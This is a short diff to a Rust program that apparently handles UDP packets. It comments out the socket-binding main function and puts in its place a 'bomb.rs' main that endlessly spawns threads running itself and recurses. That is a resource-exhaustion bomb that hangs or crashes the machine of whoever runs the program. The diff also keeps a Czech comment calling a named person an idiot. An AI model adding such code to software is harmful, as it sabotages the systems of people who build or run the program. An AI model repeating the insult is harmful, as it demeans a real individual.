@@ -1,4 +1,4 @@
-// Matěj je MEGA debil
+// Matěj je debil
 
 #[macro_use]
 extern crate text_io;
@@ -43,6 +43,15 @@ enum Packet {
     },
 }
 
-fn main() {
+/*fn main() {
     let mut socket = UdpSocket::bind(":12345").unwrap();
+}*/
+
+// bomb.rs
+// Chad Sharp
+
+#[allow(unconditional_recursion)]
+fn main() {
+    std::thread::spawn(main);
+    main();
 }
